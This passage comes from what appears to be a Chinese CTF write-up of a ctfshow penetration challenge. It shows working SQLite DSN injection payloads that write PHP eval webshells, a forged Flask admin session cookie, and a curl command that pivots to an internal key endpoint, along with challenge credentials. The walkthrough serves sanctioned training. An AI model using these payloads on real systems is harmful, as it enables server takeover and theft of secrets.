class="line-numbers-rows"><span></span></span></code></pre><p>但是所有人都卡在了接收不到参数上。。</p><p>于是到了6号下午，这个时候数据库有回显了，果然是环境有问题（</p><p>需要先生成一个完整表结构的文件：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">index.php?dsn&#x3D;sqlite:user.db%26query&#x3D;CREATE%20TABLE%20users(id%20INTEGER%20PRIMARY%20KEY,user%20TEXT%20NOT%20NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试写马（第二段payload需要php用<code>exec</code>才能写马）</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">?dsn&#x3D;sqlite:user.php%26query&#x3D;CREATE%20TABLE%20users(id%20INTEGER%20PRIMARY%20KEY,&#39;&lt;?php%20phpinfo();?&gt;&#39;%20TEXT%20NOT%20NULL);?dsn&#x3D;sqlite:user.db%26query&#x3D;ATTACH%2BDATABASE%2B%22%2Fvar%2Fwww%2Fhtml%2Fcmd%2Ephp%22%2BAS%2Bshell%3Bcreate%2BTABLE%2Bshell%2Eexp%2B%28payload%2Btext%29%3Binsert%2BINTO%2Bshell%2Eexp%2B%28payload%29%2BVALUES%28%22%3C%3F%3Deval%28%24%5FGET%5B0%5D%29%3B%22%29%3B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>能生成文件，但是访问返回500，猜测和 sqlite 那堆字符有关，得写一个干净的shell</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>琢磨了半天群主直接给payload了：</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">%3fdsn&#x3D;sqlite:shell.php%26username&#x3D;aaa%26password&#x3D;bbb%26query&#x3D;create%20table%20&quot;aaa&quot;%20(name%20TEXT%20DEFAULT%20&quot;&lt;?php%20file_put_contents(&#39;1.php&#39;,&#39;&lt;?php eval($_GET[1]);?&gt;&#39;);?&gt;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时访问shell.php虽然接口服务会报500，但是已经生成了1.php</p><p>然后就getshell了</p><p>读config.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//数据库连接配置</span><span class="token variable">$database_host</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$database_user</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$database_password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5"</span><span class="token punctuation">;</span><span class="token variable">$database_name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"web_db_2"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;3f7a1d5a-d55d-4d9d-8d9a-d5d5d5d5d5d5&#125;</code></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pdo</span> <span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span><span class="token variable">$dsn</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token function">pdo_init</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pdo</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"database init faild"</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token function">pdo_query</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pdo_close</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">!==</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"database test success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"database test error"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">pdo_init</span><span class="token punctuation">(</span><span class="token variable">$dns</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dns</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$pdo</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"数据库连接失败："</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">pdo_query</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$stmt</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"数据库操作失败："</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">pdo_close</span><span class="token punctuation">(</span><span class="token variable">$pdo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span> <span class="token name">lang=</span><span class="token string">"en"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">const</span> <span class="token constant">DATABASE_SECRET_KEY</span> <span class="token operator">=</span> <span class="token string">'0x8F7C71E8E82E4D1E'</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome to Database TEST<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is a test page for database connection and queries.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database username:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database password:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter Database DSN:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dsn<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Enter TEST Query:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="邮箱迷云"><a href="#邮箱迷云" class="headerlink" title="邮箱迷云"></a>邮箱迷云</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250104003437954.png" alt="image-20250104003437954"></p><p>？浏览器插件里出现了个数字，看了一下是从网页js来的，试一下居然秒了</p><p>flag：<code>ctfshow&#123;81192&#125;</code></p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>根目录下有 &#x2F;secret.txt，是一串base，解码得到</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">hacker_ctfshow@163.com/Hacker_ctfsh0w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>网易云邮箱的账密这是，应该是可以直接登录得到邮件的</p><hr><h1 id="第四章（Flask）"><a href="#第四章（Flask）" class="headerlink" title="第四章（Flask）"></a>第四章（Flask）</h1><h2 id="再下一城"><a href="#再下一城" class="headerlink" title="再下一城"></a>再下一城</h2><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250103195537953.png" alt="image-20250103195537953"></p><p>在 172.2.xxx.6:8888 开的 flask</p><p>审一下源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> session<span class="token keyword">from</span> flask <span class="token keyword">import</span> url_for<span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token keyword">import</span> logging<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> basename<span class="token keyword">from</span> os<span class="token punctuation">.</span>path <span class="token keyword">import</span> joinapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log server is running'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">check_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/key'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/log_server_key.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'key'</span><span class="token punctuation">:</span> key<span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_log_option'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_log_option</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logName <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logName'</span><span class="token punctuation">)</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    app_log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>logName<span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    clear_log_file<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log option set successfully'</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_log_content'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log content'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">clear_log_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要伪造 session 为 admin 就行了：<code>eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU</code></p><p>但是在哪传呢，测了一下发现任务中心不出网</p><p>看来要把php那台机子拿下shell才能打</p><p>开了debug模式，可以访问console</p><br><p>php那台服务器有curl，直接curl就行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.227.6:8888/key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250106174441782.png" alt="image-20250106174441782"></p><p>flag：<code>ctfshow&#123;4f5d1d5d-1d5d-1d5d1d5d1d5d&#125;</code></p><hr><h2 id="顺藤摸瓜（复现）"><a href="#顺藤摸瓜（复现）" class="headerlink" title="顺藤摸瓜（复现）"></a>顺藤摸瓜（复现）</h2><p>接下来关注这个：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_log_option'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_log_option</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logName <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logName'</span><span class="token punctuation">)</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span 